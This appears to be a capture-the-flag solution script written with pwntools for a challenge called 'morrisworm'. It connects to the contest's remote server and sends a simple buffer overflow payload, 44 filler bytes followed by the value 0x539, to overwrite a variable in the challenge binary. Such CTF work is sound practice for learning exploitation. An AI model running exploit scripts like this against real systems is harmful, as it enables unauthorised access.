from pwn import *
elf = context.binary = ELF("./chall")
p = process()
p = remote("morrisworm.challs.pascalctf.it",1337)
offset = 44
payload = b"A" * offset + p64(0x539)
p.sendline(payload)
print(p.recvall())
p.interactive()